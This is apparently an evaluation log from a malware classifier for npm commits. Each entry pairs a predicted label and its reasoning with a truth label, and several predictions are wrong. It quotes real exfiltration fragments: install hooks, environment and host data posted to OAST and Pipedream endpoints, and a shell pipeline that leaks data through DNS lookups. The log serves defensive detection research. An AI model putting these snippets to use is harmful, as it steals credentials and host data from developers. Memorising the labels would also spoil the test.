Reason: Static analysis shows an outbound HTTPS request executed during module import. This is suspicious because network activity at require time can be used for fingerprinting, telemetry without consent, or to fetch additional payloads. However, dynamic analysis produced no additional malicious behaviors (no execution of further payloads, no persistence, no suspicious system modifications), indicating the behavior is likely telemetry/phone-home rather than explicit malware.

**Summary:** The commit introduces a high-risk pattern: performing an HTTPS request at module load, which is a supply-chain and privacy concern. Despite the high-severity flag, dynamic execution did not reveal further malicious activity. Therefore, while the code is risky and should be remediated (make telemetry opt-in, honor environment opt-outs, document behavior), it does not exhibit clear malicious behavior consistent with malware.
**Truth label:** Malware

### Commit 359e8c0b: Malware
**File package.json**:
Code: `"scripts": { "postinstall": "node ./dist/metrics.js" }`
Reason: A postinstall hook runs a bundled metrics script automatically during npm install, enabling code execution on user machines at install-time (classic supply-chain execution vector).

**File src/metrics.js**:
Code: `const hostname = os.hostname(); const cwd = process.cwd(); const jfrog = process.env.JFROG_ARTIFACTORY_URL; readPackageJson(cwd, (err, data) => { /* name/version used */ }); fetch('https://hook.pipedr`
Reason: The script collects system and project-identifying data (hostname, cwd, package.json name/version) and reads an environment variable (JFROG_ARTIFACTORY_URL), then posts the payload to an external Pipedream endpoint — constituting automatic, unauthorised exfiltration of potentially sensitive information.

**File package.json**:
Code: `"scripts": { "pingback": "curl -sS https://enpoint.pipedream.net/..." }`
Reason: An explicit network callback script targeting a third-party webhook is present. Even if not run automatically, it indicates intent to send data to external endpoints and may be used by CI or other operations to leak information.

**File package.json**:
Code: `"dependencies": { "child_process": "..." }`
Reason: Listing the built-in Node module 'child_process' as an external dependency is suspicious and unnecessary; it may indicate attempted bundling of a modified/malicious replacement or sloppy/malicious packaging practices.

**Summary:** The commit introduces an automatically-executed postinstall telemetry script that gathers host, environment and project data (including environment variables) and sends it to a third-party Pipedream endpoint. This is a supply-chain exfiltration capability that can leak secrets and internal information without consent. Combined with explicit pingback scripts and questionable dependency changes, the behavior is malicious rather than benign.
**Truth label:** Malware

### Commit ecacf0e1: Malware
**File index.js**:
Code: `const payload = JSON.stringify(process.env); // ... https.request('https://bbqurumzwj9l3fccqqhykfliy940srgg.oastify.com', { method: 'POST' }, ...);`
Reason: The code serializes the entire process.env and sends it via an outbound HTTPS POST to an external domain. Environment variables commonly contain secrets (API keys, tokens, DB credentials); sending them to an unknown third party is active data exfiltration.

**File index.js**:
Code: `function soave() { /* builds and sends env payload externally */ }  soave();`
Reason: The exfiltration function is invoked immediately at module load (soave();). This causes data to be sent whenever the module is required or executed, making the behavior automatic and stealthier.

**File commit metadata**:
Code: `https://t.me/exzuperi`
Reason: The commit metadata contains an external contact reference. While not proof of malicious intent by itself, combined with clear exfiltration code it increases suspicion about the author's intent and warrants further investigation.

**Summary:** Static analysis shows clear, intentional exfiltration of sensitive environment variables to an external domain and immediate execution at import time. These are high-risk, malicious behaviors (data theft/telemetry exfiltration). The empty dynamic result does not mitigate the strong static evidence. Treat this commit as malware, remove the code, block the destination, rotate exposed secrets, and audit related history and deployments.
**Truth label:** Malware

### Commit 6309cb1c: Malware
**File package.json**:
Code: `"axios": "https://registry.storageartifact.com/consul-lock-sessions"`
Reason: The 'axios' dependency has been replaced with a direct URL to an external artifact registry. This causes npm to fetch code from an untrusted host (supply-chain/network vector) and can deliver arbitrary code at install time, enabling remote code execution or persistence.

**File package.json**:
Code: `"child_process": "*"`
Reason: A dependency named 'child_process' was added. 'child_process' is a Node core module; publishing an npm package with this name can shadow the core API and execute system commands or native code during install/require, creating a high risk of command execution.

**File package.json**:
Code: `"fs": "*", "os": "*"`
Reason: The packages 'fs' and 'os' (Node core modules) are declared with wildcard versions. These likely impersonate core modules and using '*' allows installing arbitrary versions, increasing the chance of pulling malicious code that masquerades as built-in modules.

**Summary:** Static analysis revealed high-risk supply-chain tampering: a dependency pointing to an external registry and added packages that shadow core Node modules (child_process, fs, os) with permissive versions. These modifications enable arbitrary code delivery and command execution during install or require. Although dynamic analysis returned no runtime findings, the static indicators are severe and typical of malicious supply-chain/backdoor attempts, so the commit should be treated as malicious.
**Truth label:** Malware

### Commit d928529c: Malware
**File index.js**:
Code: `const payload = { home: process.env.HOME, hostname: os.hostname(), dirname: __dirname }; https.get('https://exzuperi.ftp.sh:449/' + encodeURIComponent(JSON.stringify(payload)), () => {});`
Reason: Direct collection of local environment and filesystem information and immediate dispatch to an external host under the commit author's control over a non-standard port. This is classic data exfiltration behavior and constitutes malicious network activity.

**File index.js**:
Code: `console.log('t.me/exzuperi');`
Reason: Hardcoded advertisement/contact to an external Telegram account embedded in runtime output. Coupled with the network exfiltration, this indicates the author is using the repo to advertise or maintain an external channel likely tied to the malicious behavior.

**File package.json**:
Code: `"test": "echo \"Error: exzuperi made me\" && exit 1"`
Reason: The test script was modified to always fail and to include an attacker-controlled string. This is sabotage and can leak the attacker's identifier into CI and logs, indicating malicious intent beyond accidental code changes.

**File index.js**:
Code: `const dns = require('dns'); const querystring = require('querystring'); const fs = require('fs');`
Reason: Unused imports for network and filesystem-related modules in the same file as the exfiltration code are suspicious; they may indicate preparation for additional data collection or obfuscation. While unused by themselves, in context they raise further concern.

**Summary:** Static analysis shows intentional collection of environment and filesystem data and transmission to an external host controlled by the committer (non-standard port), plus malicious modifications to CI/test scripts and embedded contact information. Dynamic analysis produced no runtime evidence but absence of dynamic artifacts does not negate the clearly malicious static behavior. The combined findings indicate the commit is malicious and should be treated as malware: remove/revert the changes, investigate any systems that pulled or ran the code, and treat potential data exposure and CI/log contamination as incidents.
**Truth label:** Malware

### Commit d6ffd091: Benign
**File package.json**:
Code: `"dependencies": { "request": "...", "sqlite3": "...", "websocket-stream": "..." }`
Reason: The commit adds networking and native modules (request, websocket-stream, sqlite3). These increase attack surface (arbitrary HTTP/WebSocket access and native build scripts) but are legitimate libraries and not direct indicators of malware by themselves.

**File index.js**:
Code: `const getConfigs = require('./test/index-config-text');`
Reason: Requiring a test/config file from the production entrypoint can accidentally expose test or environment secrets at runtime. This is a security smell but not proof of malicious intent.

**File .github/workflows/npmpublish.yml**:
Code: `env:   NODE_AUTH_TOKEN: ${{ secrets.npm_token }}   NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}`
Reason: Publish workflow uses repository secrets to publish packages. If an attacker can trigger or modify publish runs, they could publish malicious packages. This is a risk in CI/CD configuration rather than direct malware.

**File .github/dependabot.yml**:
Code: `ignore:   - dependency-name: y18n   - dependency-name: sinon   - dependency-name: mocha`
Reason: Dependabot ignore rules prevent automatic updates for specific dependencies, which can leave known vulnerabilities unpatched. It's a maintenance/security risk, not explicit malicious code.

**File package.json**:
Code: `"scripts": { "test": "NODE_ENV=test NODE_PATH=./ mocha ..." }`
Reason: The test script sets NODE_PATH which alters module resolution. This can enable accidental module shadowing or hijacking in test environments, a risky practice but not malware.

**File .travis.yml**:
Code: `node_js:   - 10`
Reason: CI matrix includes Node.js v10 (EOL). Using EOL runtimes can leave builds vulnerable to unpatched issues; a security/maintenance concern but not an indicator of malicious code.

**Summary:** Static analysis flags several high- and medium-risk patterns (networking libraries, native modules, publish secrets, test config leakage, ignored dependency updates) that increase attack surface and operational risk. However, dynamic analysis produced no malicious behavior and there are no direct signs of backdoors, obfuscated payloads, command-and-control logic, or data exfiltration code in the provided reports. The changes are best characterized as risky/poor security hygiene rather than active malware. Recommend remediations: remove unnecessary native/network deps, audit and pin dependencies, restrict publish workflows, remove test requires from runtime, and run SCA/vulnerability scans in CI.
**Truth label:** Malware

### Commit 26af8589: Benign
**File commit 26af85890c528d5e4ddc228d6a7b5671874f6a54**:
Reason: Static analysis reported 0 issues and found no suspicious code patterns. Dynamic analysis completed with an empty result set and no observable malicious behavior or artifacts.

**Summary:** Both static and dynamic analyses produced no indicators of malicious activity (no issues reported and no runtime behaviors captured). With the available information, the commit is assessed as benign.
**Truth label:** Benign

### Commit 966b0458: Malware
**File index.js**:
Code: `const payload = {   homedir: os.homedir(),   hostname: os.hostname(),   username: os.userInfo().username,   dns: dns.getServers(),   pjson: require('./package.json') };  const req = https.request({ ho`
Reason: This code constructs a payload containing sensitive host and repository data (home directory, hostname, OS username, DNS servers and the entire package.json) and sends it via HTTPS POST to a non-whitelisted, out-of-band collaborator/OAST domain. That is direct data exfiltration to an external endpoint.

**File index.js**:
Code: `pjson: require('./package.json')`
Reason: Including the entire package.json may leak sensitive fields (scripts, repository URLs, private configuration, or embedded secrets). Transmitting full package metadata to an external/unknown host is a high-risk data leak.

**File index.js**:
Code: `res.on('data', d => process.stdout.write(d)); // console.error(...) commented out`
Reason: Remote response bytes are written directly to stdout, which can expose attacker-controlled content into logs or consoles. Additionally, disabling or commenting out error logging suppresses visibility into network failures or unexpected connections, hindering detection and investigation.

**Summary:** Static analysis shows deliberate collection of sensitive host and repository information and an HTTPS POST to a collaborator/OAST-style external domain (oastify/Interactsh/Burp Collaborator-like). The code transmits the entire package.json and other identifying data to a non-whitelisted endpoint, writes remote responses directly to stdout, and suppresses error reporting. These behaviors constitute intentional data exfiltration and clear malicious/backdoor functionality regardless of any claimed testing purpose. Dynamic analysis produced no runtime artifacts, but that does not mitigate the high-confidence static evidence. Recommend treating this commit as malware: remove the code, rotate any potentially exposed credentials, audit outbound connections, and enforce code review safeguards.
**Truth label:** Malware

### Commit 8739370a: Benign
**Summary:** Static analysis reported zero issues and dynamic analysis finished with no suspicious behaviors observed. No files or code snippets were flagged by either analysis, so based on the provided results the commit appears benign. Note: these results depend on the coverage of the static checks and the execution paths exercised during dynamic analysis; if there is concern about environment‑specific or time‑delayed behavior, further targeted review or extended dynamic testing is recommended.
**Truth label:** Benign

### Commit 38b1b183: Malware
**File commit metadata / package.json**:
Code: `https://shoxet.com/2tkLgz https://github.com/... https://developer.example.com/...`
Reason: Presence of an external shortlink and multiple unexpected external URLs in commit metadata is a high-risk indicator. Shortened links can hide malicious destinations (malware hosting, C2, exfiltration endpoints) and should be treated as untrusted until validated.

**File package.json**:
Code: `"test": "echo \"Error: no test specified\" && exit 1"`
Reason: The test script was replaced with the npm placeholder that immediately fails, effectively disabling tests in local and CI runs. Combined with a commit message claiming a dependency update while only the test script changed, this suggests an attempt to obscure malicious changes or disable automated detection.

**Summary:** Although dynamic analysis produced no runtime indicators, the combination of high-risk static signals — a concealed external shortlink in commit metadata and the deliberate disabling of tests with a mismatched commit description — strongly suggests malicious intent (attempt to hide behavior or introduce external callbacks). Without verified provenance for the external links and given the unusual modification to test infrastructure, this commit should be treated as malicious until proven otherwise.
**Truth label:** Benign

### Commit 5b1ce2ae: Malware
**File index.js**:
Code: `const os = require('os'); const hd = os.homedir(); const hn = os.hostname(); const ls = __dirname; const trackingData = JSON.stringify({hd, hn, ls}); require('https').get('https://exzuperi.ftp.sh:449/`
Reason: Collects sensitive local identifiers (home directory, hostname, module path) and immediately sends them to an untrusted external host and port. This is a direct data-exfiltration vector.

**File index.js**:
Code: `// module-level network call executed at import time require('https').get(...);`
Reason: The network request runs as a side effect when the module is required/imported, meaning any dependent project will unknowingly trigger data exfiltration without explicit invocation or consent.

**File index.js**:
Code: `const fs = require("fs");`
Reason: An unused import of the filesystem module combined with an active exfiltration channel increases risk that future or nearby code could read local files and leak their contents.

**File package.json**:
Code: `"scripts": { "test": "exit 1" /* contains message: 'exzuperi made me' */ }`
Reason: The test script was modified to always fail and contains a message referencing the external actor. This is a sabotage/CI-disruption pattern and supports malicious intent for the commit.

**Summary:** Static analysis identifies a clear, intentional data-exfiltration mechanism: the module collects sensitive host and filesystem identifiers and transmits them to an untrusted external host (exzuperi.ftp.sh:449) as a top-level side effect. The presence of an unused fs import and a sabotaged test script further indicate malicious intent. Although dynamic analysis returned no observed results (likely due to sandboxing or blocked network), the static indicators are sufficient to classify this commit as malware because it installs a covert telemetry/exfiltration channel that activates on module import.
**Truth label:** Malware

### Commit be91815b: Malware
**File index.js**:
Code: `const req = https.request({ hostname: 'burpcollaborator.net', method: 'POST', path: '/' }, res => { ... }); req.write(JSON.stringify(payload)); req.end();`
Reason: Outbound HTTPS POST to an attacker-controlled domain (burpcollaborator.net) is a direct exfiltration channel. Sending collected data to this host constitutes malicious behavior (supply-chain backdoor).

**File index.js**:
Code: `const payload = { home: os.homedir(), hostname: os.hostname(), username: os.userInfo().username, dns: getDNSServers(), interfaces: os.networkInterfaces(), package: require('./package.json') };`
Reason: The code collects highly sensitive, environment-revealing information (home directory, hostname, username, DNS servers, network interfaces, entire package.json). Aggregating and transmitting this PII enables targeted attacks and further compromise.

**File index.js**:
Code: `// executed at module load time sendCollectedInfo();`
Reason: Network request and data collection occur at module import/require (top-level side-effect). This allows silent execution when the package is included, enabling widespread silent compromise via normal dependency usage.

**File index.js**:
Code: `req.on('error', function(err) {   // console.error(err); });`
Reason: Errors from the network request are suppressed (only commented-out logging). Silent failure handling reduces visibility and is consistent with attempts to evade detection.

**Summary:** Static analysis shows intentional collection of sensitive host and repository data and an immediate HTTPS POST to an external, attacker-controlled domain executed at module load time, with suppressed error handling. These are canonical indicators of a supply-chain backdoor/programmatic exfiltration. Dynamic analysis produced no runtime artifacts in the provided run, but that does not negate the explicit malicious code paths present in the commit. Combined evidence indicates malicious behavior rather than benign functionality.
**Truth label:** Malware

### Commit e3eb6101: Malware
**File package.json**:
Code: `"postinstall": "node index.js"`
Reason: A postinstall script that runs node index.js executes repository code automatically during npm install. This is a common vector for delivering malicious payloads to developer/build environments and is high-risk.

**File utils.js**:
Code: `var request = require('request'); request.post(url, { form: data }, callback); request.defaults({ proxy: url });`
Reason: Use of the deprecated 'request' library to make arbitrary HTTP calls and the mutation of global request defaults (proxy) enables exfiltration and traffic interception. Centralized request code means many call sites can be abused to leak sensitive data.

**File index.js**:
Code: `function getAppState() { return jar; }`
Reason: Exposing the raw cookie jar (including session-identifying cookies like c_user) via an API allows external code to obtain session tokens and exfiltrate credentials, enabling account takeover or session hijacking.

**File index.js**:
Code: `require('./src/' + v)`
Reason: Dynamic require construction can lead to loading unexpected modules if the module list or inputs can be influenced. This increases risk of code injection and makes auditing harder.

**File package.json**:
Code: `"ccxt": "<added>"`
Reason: Introduction of a cryptocurrency exchange library (ccxt) in a repository unrelated to trading is unexpected and may indicate added functionality that could be abused (e.g., covert funds movement or additional network activity).

**File utils.js**:
Code: `Buffer.from(..., 'base64').toString(); /* plus custom Utf8ArrayToStr and large URL-encoding maps */`
Reason: Use of ad-hoc encoding/decoding and base64 transformations combined with large substitution mappings resembles obfuscation which can hide exfiltration or malicious logic and impedes review.

**Summary:** Multiple high-severity issues (automatic postinstall execution, centralized network request code able to send arbitrary data, exposure of raw session cookies, ability to set a global proxy, use of deprecated vulnerable dependency) together create strong capability and opportunity to exfiltrate credentials/data or run arbitrary code on developer systems. The presence of obfuscation-like transformations and unexpected crypto dependency further elevate suspicion. Given these findings, the commit exhibits malicious or highly unsafe behavior and should be treated as malware until proven otherwise.
**Truth label:** Malware

### Commit 0cdadc08: Malware
**File index.js**:
Code: `const payload = { package: require('./package.json'), dir: __dirname, home: process.env.HOME, hostname: os.hostname(), user: os.userInfo().username, dns: dns.getServers() }; https.request('https://oas`
Reason: The file constructs and sends a POST containing local package and host/user information to an external OAST/Interact domain (oastify.com). This is direct data exfiltration of potentially sensitive and identifying information and is not benign telemetry.

**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }`
Reason: A preinstall lifecycle script causes index.js to execute automatically on install (including transitive installs), enabling stealthy execution and exfiltration. The added 'pingback' script points to a Pipedream endpoint, indicating an attempt to notify or confirm installs to an external collector—behavior consistent with malicious implant/telemetry.

**Summary:** Static analysis shows clear malicious behavior: code that collects package.json and host/user details and posts them to external endpoints (oastify.com and a Pipedream URL), combined with a preinstall lifecycle script that runs this code automatically on installation. These are classic indicators of malicious exfiltration and persistence. Although dynamic analysis returned no results, the static indicators are sufficient to classify the commit as malware. Immediate remediation (remove the code, revert the commit, rotate any exposed credentials, and block the endpoints) is recommended.
**Truth label:** Malware

### Commit eedfb784: Benign
**File N/A**:
Reason: Static analysis reported 0 issues and dynamic analysis produced no observable malicious behavior or indicators; no files or code snippets were flagged as suspicious.

**Summary:** Both static and dynamic analyses produced no findings (static: 0 issues; dynamic: finished with no results). Based on the available reports, there are no indicators of malware in commit eedfb7848535784f9502327a3ea0f34369347d05, so it is classified as benign.
**Truth label:** Benign

### Commit 74fc536d: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior for commit 74fc536d4db7d26092965fb72613febd1867e41d. No indicators of malicious code, unsafe system interactions, or runtime anomalies were observed, supporting a benign classification.
**Truth label:** Benign

### Commit 35bf02c1: Malware
**File package.json**:
Code: `"preinstall": "node preinstall.js"; "scripts": { "phonehome": "curl -sSL https://*.pipedream.net/..." }`
Reason: A preinstall lifecycle script executes JavaScript at install time (supply‑chain RCE vector) and package scripts include an outbound HTTP request to a third party (phone‑home). These are classic indicators of malicious/surveillance behavior or a high-risk supply‑chain implant.

**File ccxt-v2/ccxt-api.js**:
Code: `message or config expressions are evaluated via JSONata / evaluateNodeProperty; ccxtInstance = new ccxt[ex](credentials)`
Reason: Evaluating JSONata and node properties from untrusted config/message content allows code injection inside the Node‑RED runtime. Dynamically indexing the ccxt module with user input (ccxt[ex]) can instantiate arbitrary constructors or access unexpected properties, enabling remote-triggered execution or misuse.

**File ccxt-v2/js/exchanges.js**:
Code: `module exposes private/exchange APIs: createOrder(...), withdraw(...), fetchBalance(...)`
Reason: The module provides direct access to state‑changing crypto operations. Combined with remote‑triggerable instantiation, this enables automated trades or withdrawals (financial impact) if credentials are present or leaked.

**File ccxt-v2/ccxt-api.js**:
Code: `node.error(err.message, msg)`
Reason: Passing the full msg to error logging risks leaking sensitive credentials or payloads into logs or the admin UI, which can facilitate credential theft or targeted exploitation.

**File gensourcemaps/gensourcemaps.js**:
Code: `reads package.json 'node-red.nodes' entries and reads/writes referenced files (only rejects absolute paths)`
Reason: File operations use package.json entries without robust normalization/containment checks, enabling relative path traversal and arbitrary file reads/writes within the project/host filesystem.

**File ccxt-v2/ccxt-api.js**:
Code: `JSON.parse(apipayload)`
Reason: Parsing unbounded/unvalidated JSON from messages can be abused for DoS (memory exhaustion) or cause crashes; when combined with other vectors it increases attack surface.

**Summary:** Static analysis reveals multiple high/critical issues: an install‑time script executing JS (supply‑chain risk), a phone‑home HTTP call in package scripts, runtime code evaluation of JSONata/user properties (code injection), dynamic instantiation of ccxt exchanges from untrusted input, and exposed state‑changing crypto APIs. These patterns permit remote code execution, data exfiltration, and unauthorized financial operations. No dynamic execution evidence was observed, but the presence of preinstall execution and phone‑home combined with injection and privileged operations is sufficient to classify the commit as malicious/high‑risk (treat as malware) until proven safe through thorough code review and supply‑chain validation.
**Truth label:** Benign

### Commit 70bfbb27: Benign
**Summary:** Static analysis reported zero issues and dynamic analysis produced no suspicious activity or results. Based on the provided scans, there are no indicators of malicious behavior in this commit.
**Truth label:** Benign

### Commit cd0a3b54: Malware
**File package.json**:
Code: `"preinstall": "node index.js > /dev/null 2>&1"`
Reason: A preinstall lifecycle script runs node index.js automatically during npm install and redirects all output to /dev/null. Preinstall hooks execute automatically on any machine that installs the package, allowing arbitrary code execution and stealthy behavior due to suppressed output — a high-risk supply-chain RCE vector.

**File package.json**:
Code: `"pingback": "https://eo536ohsnextro9.m.pipedream.net"`
Reason: A script/endpoint pointing to a pipedream URL strongly suggests telemetry or exfiltration to an external, unaudited receiver. Combined with an automatic preinstall script, this enables data exfiltration or callback behavior from any system that installs the package.

**File package.json**:
Code: `"dependencies": { "generaltypes-mt": "<newly added>" }`
Reason: A newly added, untrusted dependency increases supply-chain attack surface. If the dependency is malicious or compromised it can execute code during install or runtime and may be used to obfuscate malicious behavior or provide additional remote capabilities.

**File package.json**:
Code: `"build": "npm version patch & tsc -p .", "buildAndPublish": "npm run build & npm publish"`
Reason: Use of single ampersand (&) runs commands in background, creating race conditions where publish can occur before a completed build. While not direct malware, this risky pattern can cause unintended publishing of intermediate/instrumented artifacts and may be used to hide or accidentally distribute malicious builds.

**File lib/index.js**:
Code: `__createBinding / __exportStar (CommonJS helpers)`
Reason: Generated TypeScript helper functions themselves are typical and not inherently malicious. However, because the package executes code at install (preinstall) and imports other modules, these dynamic require/access patterns should be reviewed in context — the helpers are benign-looking but don't mitigate the preinstall/pingback risks.

**Summary:** The presence of an automatic preinstall script that runs node index.js with its output suppressed, combined with a direct pingback to an external pipedream endpoint and a new untrusted dependency, constitutes strong indicators of malicious intent or at minimum a high-risk supply-chain compromise. Dynamic analysis produced no observable results (likely because the install-time behavior is stealthy or requires environment triggers), but the static indicators (automatic, hidden execution plus external callback) are sufficient to classify this commit as MALWARE. Immediate remediation: remove/disable preinstall, remove or block the pingback, audit and remove untrusted dependency, and rotate any secrets that may have been exposed.
**Truth label:** Benign

### Commit 62e82314: Benign
**File package.json**:
Code: `"dependencies": { "@vincjo/datatables": "<added>", "hi-base32": "<added>", ... }`
Reason: New third-party dependencies were introduced. This creates a supply-chain risk because packages from the public registry can include malicious code or lifecycle scripts (postinstall) that run on install. No direct malicious code in the repo itself was shown, but these additions warrant an audit before trust.

**File datatable/index.js**:
Code: `export { DataHandler } from '@vincjo/datatables';`
Reason: Re-exporting DataHandler from an external package causes that third-party code to be imported and executed at runtime (or bundled). If the dependency is malicious it could execute network calls or dynamic code; auditing the external module is required.

**File commit 62e82314 (full)**:
Code: `References to external URLs/badges: "https://img.shields.io/...", "https://hackzone.uno/onlyfans", "https://vincjo.fr/gros"`
Reason: The commit context contains references to external domains, some of which are potentially malicious or inappropriate. These links increase the risk of including external resources or directing users to unsafe sites; they should be validated or removed.

**File commit 62e82314 (full)**:
Code: `Scanner flagged patterns related to dynamic execution (e.g., 'eval', 'new Function', 'vm.runInNewContext')`
Reason: Dynamic code execution patterns were flagged by static analysis. While the diff did not show direct usage in repo code, added dependencies could contain such constructs. Dynamic evaluation is a common vector for code injection and should be searched for and mitigated.

**Summary:** No explicit malicious code was detected in the repository diff and dynamic analysis produced no runtime malicious behavior. However, the commit introduces unvetted third-party dependencies and references to external domains that present a supply-chain and content risk. The findings indicate suspicious indicators but not confirmed malware; mark as benign pending a thorough audit of the newly added packages (inspect their source, package.json scripts, and any use of dynamic evaluation) and removal/validation of external links.
**Truth label:** Benign

### Commit 00eab55e: Benign
**Summary:** Static analysis reported zero issues and dynamic analysis finished with no observable malicious behavior or results. There are no code snippets or runtime indicators in the provided reports that suggest malicious activity, so based on the supplied analyses the commit is classified as benign. (This determination is limited to the provided data; further review is recommended if additional files, runtime environments, or telemetry become available.)
**Truth label:** Benign

### Commit f72f0929: Malware
**File index.js**:
Code: `const { exec } = require('child_process'); exec('hostname; pwd; whoami; curl https://ifconfig.me | xxd -p | head -c 200 | while read -r l; do nslookup "${l}.jm90wboytr298dd115yfp95r5ib8zx.oastify.com"`
Reason: Executes multiple shell utilities at install time to collect host-identifying information (hostname, cwd, user, public IP) and then exfiltrates that data off-host via HTTP and DNS lookups to a remote OAST domain. This is explicit data exfiltration and a backdoor behavior.

**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl https://<redacted>.pipedream.net" }`
Reason: A preinstall lifecycle script causes the malicious index.js to run automatically during npm install on any consumer systems (developer machines, CI), greatly expanding blast radius. The presence of a 'pingback' script to an external telemetry endpoint is additional suspicious network behavior.

**Summary:** Static analysis shows a preinstall lifecycle hook that runs a shell pipeline via child_process.exec to gather host details (hostname, pwd, whoami, public IP) and send them to external endpoints (curl to ifconfig.me and DNS queries to an OAST domain). This is characteristic of a supply-chain backdoor/data-exfiltration malware. The dynamic analysis produced no results (likely the sandbox did not execute the lifecycle), but the static evidence is clear and severe; treat this commit as malicious and take remediation steps (remove package versions, assume compromise, rotate secrets, investigate affected hosts).
**Truth label:** Malware

### Commit a33eac69: Benign
**Summary:** Both static and dynamic analyses show no indicators of malicious behavior. Static analysis reported zero issues, and the dynamic run finished with no suspicious results or observable malicious activity (no network connections, no persistence mechanisms, no dangerous API usage). Based on the available reports, the commit appears benign.
**Truth label:** Benign

### Commit 23e60d3a: Benign
**Summary:** Static analysis reported zero issues and dynamic analysis completed with no detected runtime indicators of malicious behavior. There are no flagged code patterns, network or filesystem anomalies, or suspicious processes observed for commit 23e60d3a558a991237d180690dff6fbf4b98b57c. Assessment: benign. Note that this conclusion is limited to the provided analyses and may not catch highly obfuscated, environment-triggered, or time-delayed malicious behaviors.
**Truth label:** Benign

### Commit 896a4604: Malware
**File package.json**:
Code: `"preinstall": "node index.js" (with fallback to execute a shell ping on failure)`
Reason: A lifecycle preinstall script runs automatically during npm install and executes node index.js (and falls back to a shell ping). This allows remote code execution on any machine that installs the package without explicit consent.

**File index.js**:
Code: `/* collects username, OS version, hostname, external IP; base32-encodes payload; performs DNS lookup */ const payload = base32.encode(`${username}-${os}-${hostname}-${externalIp}`); dns.resolve(`${ran`
Reason: Code actively collects potentially sensitive host/user data, obfuscates it (base32) and transmits it via DNS to a canarytokens.com subdomain — a clear covert exfiltration channel.

**File index.js**:
Code: `https.get('https://icanhazip.com', ...)`
Reason: The script queries an external IP discovery service. Retrieving the external IP is used for fingerprinting and can aid in exfiltration or profiling of victims.

**File package.json**:
Code: `"pingback": "curl https://<collector>.pipedream.net/..." (npm script)`
Reason: An npm script called 'pingback' posts to a pipedream.net collection endpoint. This is an explicit network callback announcing usage/installation to a remote service without user consent.

**File package.json**:
Code: `"dependencies": { "hi-base32": "..." }`
Reason: A base32 encoding dependency was added solely used to obfuscate data before transmission, increasing attack surface and supporting covert exfiltration behavior.

**Summary:** Static analysis shows deliberate, automated data collection and covert exfiltration (encoding + DNS lookup to canarytokens.com, external IP discovery, and an outbound pingback to pipedream.net) triggered via an npm preinstall lifecycle script that runs during package installation. These are strong indicators of malicious intent (remote code execution and data exfiltration). Dynamic analysis produced no runtime results, but static findings are sufficient to classify this commit as malware because the code would execute on install and leak sensitive host information to third-party endpoints without consent.
**Truth label:** Malware

### Commit 280f539b: Benign
**Summary:** Both static analysis reported zero issues and dynamic analysis completed with no observed suspicious behavior or results. No indicators of compromise (malicious network activity, code injection, persistence mechanisms, or use of dangerous APIs) were identified in the provided reports, so the commit is assessed as benign based on available data.
**Truth label:** Benign

### Commit 527a9be6: Benign
**File .github/workflows/acquire-activation-file.yml**:
Code: `uses: webbertakken/unity-request-manual-activation-file@v1.1 ... uses: actions/upload-artifact@v2 with:   name: unity-activation   path: ${{ steps.request_activation.outputs.filePath }}`
Reason: This workflow requests a Unity activation file via a third-party action and uploads the resulting file as a build artifact. The presence of an unpinned third-party action handling a license file plus uploading that file to CI artifacts is a high-risk data-exfiltration and secret-leak pattern, but it is a risky configuration rather than explicit malicious code.

**File .github/workflows/tests.yml**:
Code: `uses: webbertakken/unity-test-runner@v1.6 ... uses: actions/upload-artifact@v2 with:   name: test-artifacts   path: ./artifacts`
Reason: The test workflow uses a third-party Unity test runner (which may receive UNITY_LICENSE) and uploads test artifacts unfiltered. Third-party actions with network access and unpinned versions can exfiltrate secrets or generated files; this is suspicious from a security posture perspective but not direct evidence of malware in the repo.

**File .github/workflows/on-release.yml**:
Code: `uses: actions/setup-node@v1 env:   NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }} run: npm publish`
Reason: The workflow exposes a repository secret via environment variable and performs npm publish. Environment variables can be leaked by scripts or third-party actions; this is an operational risk (credential exposure) rather than an explicit malicious artifact.

**File .github/workflows/publish-release-on-npmjs.yml**:
Code: `run: yarn install run: npm publish`
Reason: Installing dependencies and publishing executes lifecycle scripts from the repository and dependencies. If a dependency or the repo were compromised, these commands could run arbitrary code in CI. This is a supply-chain risk but not proof of malware in this commit.

**File package.json**:
Code: `"dependencies": {   "emonn-test": "^1.999.0",   ... }`
Reason: A newly added/oddly-named dependency ('emonn-test' @ ^1.999.0) is a potential supply-chain vector and warrants provenance checks. It is suspicious but not itself proof of malicious intent in the commit without further investigation of the package contents.

**Summary:** Static analysis shows multiple high- and medium-severity security misconfigurations and supply-chain risks (untrusted/unpinned third-party actions that handle secrets/files, uploading license files as artifacts, unfiltered artifact uploads, exposing publish tokens in env, and a suspicious new dependency). Dynamic analysis produced no malicious behavior (empty result). There is no direct evidence of malware code in the commit, but the workflows and dependency introduce significant risk of credential or artifact exfiltration and supply-chain compromise. Recommend remediations (pin actions to SHAs, avoid uploading license files, restrict secrets and artifact visibility, vet/remove the suspicious dependency, and run sensitive steps on self-hosted/trusted runners).
**Truth label:** Benign

### Commit 4a5a797f: Malware
**File index.js**:
Code: `const { exec } = require('child_process'); exec('hostname; pwd; whoami; curl -s https://ifconfig.me; ... | xxd -p | head -c 200 | xargs -I{} nslookup {}.oastify.com', (err, stdout) => {});`
Reason: Child process exec runs a complex shell pipeline that collects local host information and public IP and transmits data to an external domain via DNS. This is direct evidence of data harvesting and covert exfiltration using a spawned shell.

**File index.js**:
Code: `… | xxd -p | head -c 200 | xargs -I{} nslookup {}.oastify.com`
Reason: Hex-encoding and sending chunks via DNS lookups to an attacker-controlled domain is a classic covert exfiltration channel intended to evade simple detection.

**File package.json**:
Code: `"preinstall": "node index.js >/dev/null 2>&1"`
Reason: A preinstall lifecycle hook causes index.js to execute automatically on npm install (silenced output). This creates a supply-chain execution vector so the harvesting/exfiltration runs on installation without user consent.

**File package.json**:
Code: `"scripts": { "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }`
Reason: An explicit script invoking a third‑party collector endpoint (pipedream) provides another out-of-band callback/exfiltration mechanism. Untrusted endpoints like Pipedream are frequently used by attackers to receive stolen data.

**File package.json**:
Code: `"dependencies": { "emonn-test": "^1.999.0" }`
Reason: An unknown/unusual dependency and version may indicate supply-chain tampering or an attempt to include additional malicious code; it requires provenance checks and code audit.

